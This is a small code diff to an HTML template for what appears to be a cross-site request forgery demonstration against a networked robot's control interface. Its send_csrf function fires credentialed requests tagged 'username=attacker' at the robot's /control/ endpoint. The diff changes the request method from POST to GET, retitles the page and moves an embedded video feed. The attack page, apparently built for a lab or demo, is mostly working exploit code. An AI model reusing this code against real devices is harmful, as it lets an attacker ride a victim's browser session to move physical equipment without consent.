@@ -19,7 +19,7 @@ $( document ).ready(function() {
 function send_csrf(command){
 	var request = new XMLHttpRequest();
 	var params = "username=attacker";
-	request.open('POST', "http://<%= robot_ip %>:3000/control/"+command, true);
+	request.open('GET', "http://<%= robot_ip %>:3000/control/"+command, true);
 	request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 	request.setRequestHeader("Content-length", params.length);
 	request.withCredentials = true;
@@ -29,7 +29,7 @@ function send_csrf(command){
 </script>
 
 <div class="container">
-	<h1>The Control Interface (Ugly Version)</h1>
+	<h1>The Control Interface</h1>
 	<button id="up" class="btn btn-primary">up</button>
 	<button id="down" class="btn btn-primary">down</button>
 	<button id="left" class="btn btn-primary">left</button>
@@ -40,6 +40,6 @@ function send_csrf(command){
 	<div>
 	    <a href="/"><p>Back to home</p>
 	</div>
+	<iframe style="width:700px;height:500px;" frameborder="0" src="http://<%= robot_ip %>:3000/video_feed"></iframe>
 </div>
 
-<iframe style="width:600px;height:500px;" frameborder="0" src="http://<%= robot_ip %>:3000/video_feed"></iframe>
